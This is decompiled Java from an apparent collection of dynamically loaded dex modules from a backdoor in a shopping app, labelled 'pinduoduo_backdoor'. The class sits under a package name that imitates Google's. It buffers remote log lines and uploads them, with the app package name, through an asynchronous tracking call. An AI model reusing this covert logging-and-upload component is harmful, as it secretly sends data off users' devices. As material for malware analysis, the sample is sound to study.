package com.google.android.sd.biz_dynamic_dex.td.logcat.a.b;

import android.content.Context;
import com.google.android.sd.biz_dynamic_dex.base.a;

public final class b {
  private static StringBuffer a = new StringBuffer();
  
  public static void a(Context paramContext) {
    // Byte code:
    //   0: ldc com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b
    //   2: monitorenter
    //   3: getstatic com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b.a : Ljava/lang/StringBuffer;
    //   6: astore_1
    //   7: aload_1
    //   8: ifnull -> 116
    //   11: aload_1
    //   12: invokevirtual length : ()I
    //   15: ifne -> 21
    //   18: goto -> 116
    //   21: new java/util/HashMap
    //   24: dup
    //   25: invokespecial <init> : ()V
    //   28: astore_1
    //   29: aload_1
    //   30: ldc 'type'
    //   32: ldc '10'
    //   34: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   39: pop
    //   40: aload_1
    //   41: ldc 'ext_log'
    //   43: getstatic com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b.a : Ljava/lang/StringBuffer;
    //   46: invokevirtual toString : ()Ljava/lang/String;
    //   49: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   54: pop
    //   55: aload_1
    //   56: ldc 'pkg'
    //   58: aload_0
    //   59: invokevirtual getPackageName : ()Ljava/lang/String;
    //   62: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   67: pop
    //   68: ldc '[%s] ext_log : %s'
    //   70: iconst_2
    //   71: anewarray java/lang/Object
    //   74: dup
    //   75: iconst_0
    //   76: aload_0
    //   77: invokevirtual getPackageName : ()Ljava/lang/String;
    //   80: aastore
    //   81: dup
    //   82: iconst_1
    //   83: getstatic com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b.a : Ljava/lang/StringBuffer;
    //   86: aastore
    //   87: invokestatic format : (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   90: pop
    //   91: invokestatic c : ()V
    //   94: new java/lang/StringBuffer
    //   97: dup
    //   98: invokespecial <init> : ()V
    //   101: putstatic com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b.a : Ljava/lang/StringBuffer;
    //   104: aload_0
    //   105: sipush #371
    //   108: aload_1
    //   109: invokestatic submitTrackAsync : (Landroid/content/Context;ILjava/util/Map;)V
    //   112: ldc com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b
    //   114: monitorexit
    //   115: return
    //   116: invokestatic c : ()V
    //   119: ldc com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b
    //   121: monitorexit
    //   122: return
    //   123: astore_0
    //   124: new java/lang/StringBuilder
    //   127: dup
    //   128: ldc 'ext_log_error : '
    //   130: invokespecial <init> : (Ljava/lang/String;)V
    //   133: aload_0
    //   134: invokevirtual getMessage : ()Ljava/lang/String;
    //   137: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   140: pop
    //   141: invokestatic c : ()V
    //   144: ldc com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b
    //   146: monitorexit
    //   147: return
    //   148: astore_0
    //   149: ldc com/google/android/sd/biz_dynamic_dex/td/logcat/a/b/b
    //   151: monitorexit
    //   152: aload_0
    //   153: athrow
    // Exception table:
    //   from	to	target	type
    //   3	7	123	finally
    //   11	18	123	finally
    //   21	112	123	finally
    //   116	119	123	finally
    //   124	144	148	finally
  }
  
  public static void a(String paramString) {
    try {
      "remoteLog : ".concat(String.valueOf(paramString));
      a.c();
      StringBuffer stringBuffer = a;
      if (stringBuffer == null)
        return; 
      stringBuffer.append(System.currentTimeMillis());
      stringBuffer.append("_");
      stringBuffer.append(paramString);
      stringBuffer.append("\n");
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\a\b\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */